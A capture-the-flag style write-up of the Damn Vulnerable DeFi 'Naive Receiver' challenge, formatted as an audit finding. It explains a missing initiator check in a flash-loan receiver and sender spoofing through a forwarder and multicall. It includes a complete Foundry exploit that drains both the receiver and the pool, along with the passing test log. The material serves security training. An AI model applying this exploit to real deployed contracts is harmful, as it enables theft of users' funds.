# Damn Vulnerable Defi - Naive Receiver
- Scope
    - BasicForwarder.sol
    - FlashLoanReceiver.sol  
    - Multicall.sol
    - NaiveReceiverPool.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## `onFlashLoan()` does not verify the initiator of the transaction & `multiCall()` does not append the original sender's address

### Summary
1. `onFlashLoan()` does not verify the initiator of the transaction, allowing the initiator to force another user's address to be the borrower and pay flash loan fees to the pool.
2. `multiCall()` does not append the original sender's address if called by Forwarder, allowing a user to call `withdraw()` from pool under the pretext of Forwarder's address


### Vulnerability Details
1. `onFlashLoan()` does not verify the initiator of the transaction
```diff
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
```
2. `multiCall()` does not append the original sender's address if called by Forwarder.
```
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
```
### Impact/Proof of Concept
```
function test_naiveReceiver() public checkSolvedByPlayer {
        // 1. Drain from Receiver
        console.log("Receiver's beforeBalance: ", weth.balanceOf(address(receiver)) / 1e18);
        uint256 numLoans = 10;
        bytes[] memory data = new bytes[](numLoans);
        bytes memory flashLoanCallData = abi.encodeCall(
            pool.flashLoan,
            (receiver, address(weth), 0, "")
        );
        for (uint256 i; i < numLoans; ) {
            data[i] = flashLoanCallData;
            unchecked {
                ++i;
            }
        }
        pool.multicall(data); // Transaction #1
        console.log("Receiver's afterBalance: ", weth.balanceOf(address(receiver)) / 1e18);

        // 2. Drain from Pool
        console.log("Pool's beforeBalance: ", weth.balanceOf(address(pool)) / 1e18);
        bytes[] memory multicallData = new bytes[](1);
        multicallData[0] = abi.encodePacked(
                abi.encodeCall(
                    pool.withdraw,
                    (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
                ),
                deployer
            );


        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: 0,
            data: abi.encodeCall(Multicall.multicall, (multicallData)),
            deadline: block.timestamp
        });

        bytes32 messageHash = forwarder.getDataHash(request);
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                messageHash
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        address signer = ECDSA.recover(digest, signature);
        assertEq(signer, player, "invalid signer");

        forwarder.execute(request, signature); // Transaction #2
        console.log("Pool's afterBalance: ", weth.balanceOf(address(pool)) / 1e18);
        console.log("Recovery's Balance: ", weth.balanceOf(address(recovery)) / 1e18);
    }
```

Results
```diff
[PASS] test_naiveReceiver() (gas: 419423)
Logs:
  Receiver's beforeBalance:  10
  Receiver's afterBalance:  0
  Pool's beforeBalance:  1010
  Pool's afterBalance:  0
  Recovery's Balance:  1010
```
